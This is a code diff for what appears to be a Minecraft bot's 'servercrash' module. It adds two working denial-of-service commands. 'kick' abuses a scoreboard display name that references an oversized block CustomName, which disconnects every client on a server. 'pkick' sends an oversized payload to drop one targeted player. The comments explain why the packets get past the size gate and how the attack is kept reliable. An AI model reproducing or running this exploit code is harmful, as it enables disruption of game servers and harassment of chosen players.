@@ -5,6 +5,7 @@ const {
     parseChestArgs,
     clampDoublings,
     buildCrashChest,
+    targetedKick,
     SEED_LENGTH,
     BYTES_PER_CHAR
 } = require('../crash');
@@ -82,6 +83,62 @@ const METHODS = {
             // The trigger goes last: once the name is read the packet is built.
             ctx.run(display);
             return true;
+        }
+    },
+    // The packet that actually reaches every client is ClientboundSetScorePacket:
+    // the sidebar display name is serialised once per player and broadcast to the
+    // whole list, and it is not in the mixin's skippable set, so an oversized
+    // name throws PacketTooLarge on every connection at once. The component is a
+    // block reference, so the size comes from whatever name is already sitting
+    // in the world -- point it at a block whose CustomName is past 8 MiB.
+    kick: {
+        description: 'sidebar score display reading an oversized block; kicks every client (server-wide)',
+        run: async ctx => {
+            const numbers = ctx.args.slice(1, 4).map(value => parseInt(value, 10));
+            const explicit = numbers.length === 3 && numbers.every(Number.isInteger);
+            const position = explicit
+                ? { x: numbers[0], y: numbers[1], z: numbers[2] }
+                : ctx.bot.crashChest || chestPosition(ctx.bot);
+            if (!position) {
+                return ctx.reply(
+                    `Usage: ${ctx.prefix}servercrash kick <x> <y> <z> (a block whose CustomName is over 8 MiB).`
+                );
+            }
+
+            const at = `${position.x} ${position.y} ${position.z}`;
+            // Two references: one is already enough past the gate, the second
+            // keeps the packet oversized even if the stored name shrank.
+            const refs = new Array(DISPLAY_SELECTORS).fill({ nbt: 'CustomName', block: at });
+            const display = `scoreboard players display name ${SCOREBOARD_HOLDER} ${SCOREBOARD_OBJECTIVE} ` +
+                JSON.stringify({ text: '', extra: refs });
+
+            ctx.run(`scoreboard objectives remove ${SCOREBOARD_OBJECTIVE}`);
+            await sleep(STEP_MS);
+            ctx.run(`scoreboard objectives add ${SCOREBOARD_OBJECTIVE} dummy`);
+            await sleep(STEP_MS);
+            ctx.run(`scoreboard objectives setdisplay sidebar ${SCOREBOARD_OBJECTIVE}`);
+            ctx.run(`scoreboard players set ${SCOREBOARD_HOLDER} ${SCOREBOARD_OBJECTIVE} 1`);
+            await sleep(STEP_MS);
+
+            ctx.reply(`Scoreboard broadcast on ${at}; sending the payload.`);
+            ctx.run(display);
+            return true;
+        }
+    },
+    // One player, one packet, nobody else: the payload goes out on that
+    // connection alone and the rest of the list never sees it. The server drops
+    // that connection shortly after, on its own timeout.
+    pkick: {
+        description: 'targeted kick: one player, the rest of the list untouched',
+        run: async ctx => {
+            const name = String(ctx.args[1] || '').trim();
+            if (!name) return ctx.reply(`Usage: ${ctx.prefix}servercrash pkick <player> [count]`);
+
+            const command = targetedKick(name, ctx.args[2]);
+            if (!command) return ctx.reply(`Usage: ${ctx.prefix}servercrash pkick <player> [count]`);
+            if (!ctx.run(command)) return ctx.reply('Core is not ready; the kick was not sent.');
+
+            return ctx.reply(`Kick aimed at ${name}, that connection only.`);
         }
     },
     // The chest is built exactly as `crashchest` builds it, then broken with
